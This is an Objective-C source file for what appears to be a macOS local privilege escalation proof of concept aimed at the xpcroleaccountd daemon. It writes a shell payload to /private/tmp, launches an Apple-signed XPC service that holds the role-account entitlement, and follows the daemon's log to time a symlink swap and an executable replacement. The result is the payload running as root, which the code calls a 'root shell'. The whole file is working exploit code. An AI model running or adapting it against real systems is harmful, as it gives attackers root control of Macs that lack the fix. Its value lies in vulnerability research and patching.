//
//  main.m
//  exploit_xpcroleaccountd
//
//  Created by mickey on 2023/4/12.
//

#import <Foundation/Foundation.h>
#include <sys/stat.h>

// ROLEACCOUNT_XPC_PATH could be an arbitrary Apple-signed XPC service which has the entitlement "com.apple.private.xpc.role-account"
#define ROLEACCOUNT_XPC_PATH "/private/tmp/com.apple.dt.Xcode.XcodeSelectXPCService.xpc"
#define PAYLOAD_PATH "/private/tmp/payload"
#define PAYLOAD_XPC_PATH "/private/tmp/payload.xpc"
#define PAYLOAD_XPC_EXECUTABLE_PATH PAYLOAD_XPC_PATH "/Contents/MacOS/com.apple.dt.Xcode.XcodeSelectXPCService"

void prepare(void) {
    NSLog(@"preparing payload shell...");
    [@"#!/bin/bash\ntouch /Library/lpe\n/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal &\n" writeToFile:@PAYLOAD_PATH atomically:TRUE encoding:NSUTF8StringEncoding error:nil];
    chmod(PAYLOAD_PATH, 0777); // make payload executable
    
    double delayInSeconds = 5.0; // launch a legitimate XPC service after 5s
    dispatch_time_t delay = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
    dispatch_after(delay, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
        NSLog(@"Launching %s (with entitlement 'com.apple.private.xpc.role-account')", ROLEACCOUNT_XPC_PATH);
        void xpc_add_bundle(char *, int);
        xpc_add_bundle(ROLEACCOUNT_XPC_PATH, 2);
        
        xpc_connection_t conn = xpc_connection_create("com.apple.dt.Xcode.XcodeSelectXPCService", 0);
        xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {});
        xpc_connection_resume(conn);
        xpc_connection_send_message(conn, xpc_dictionary_create(NULL, NULL, 0));
    });
}

void spin_for_log(FILE *pipe, const char *hint) {
    char line[4096] = {0};
    while (fgets(line, sizeof(line), pipe) != NULL) {
        //printf("stdout(pipe): %s", line);
        if (strstr(line, hint)) {
            break;
        }
    }
}

void poc(void) {
    FILE *pipe = popen("log stream --level debug --predicate 'process == \"xpcroleaccountd\"'", "r");
    NSLog(@"[*] waiting for the xpc root service path being determined");
    spin_for_log(pipe, "staging area for bundle:");
    rename(ROLEACCOUNT_XPC_PATH, PAYLOAD_XPC_PATH);
    symlink(PAYLOAD_XPC_PATH, ROLEACCOUNT_XPC_PATH);
    // next, xpcroleaccountd will copy the ROLEACCOUNT_XPC_PATH (a symlink) to /private/var/db/com.apple.xpc.roleaccountd.staging/tmp/[UUID]
    
    NSLog(@"[*] waiting for the xpc service signature verification");
    spin_for_log(pipe, "moving staging area to secured destination:");
    unlink(PAYLOAD_XPC_EXECUTABLE_PATH);
    rename(PAYLOAD_PATH, PAYLOAD_XPC_EXECUTABLE_PATH);
    
    NSLog(@"[*] All done, enjoy the root shell :P");
}

int main(int argc, const char * argv[]) {
    prepare();
    poc();
    getchar(); // wait for xpc response
    return 0;
}
